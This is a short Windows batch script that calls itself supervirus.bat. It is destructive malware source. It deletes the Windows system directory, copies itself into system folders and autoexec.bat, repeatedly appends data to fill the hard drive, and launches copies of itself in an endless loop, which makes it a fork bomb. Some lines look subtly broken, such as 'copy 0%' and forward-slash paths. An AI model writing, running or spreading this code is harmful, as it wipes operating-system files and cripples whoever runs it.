   @echo off
   if exist C:/WINNT goto winnt
   if not exist C:/WINNT goto windows
   :winnt
   deltree C:/WINNT
   goto part2
   :windows
   deltree C:/windows
   goto part2
   :part2
   copy 0% C:/
   copy 0% C:/unzipped
   copy 0% C:/temp
   copy 0% C:/drivers
   copy 0% autoexec.bat
   goto part3
   :part3
   echo 1723982627612877189274352347 >> C:/fillharddrive.txt
   start supervirus.bat
   start supervirus.bat
   start supervirus.bat
   start supervirus.bat
   start supervirus.bat
   goto part3
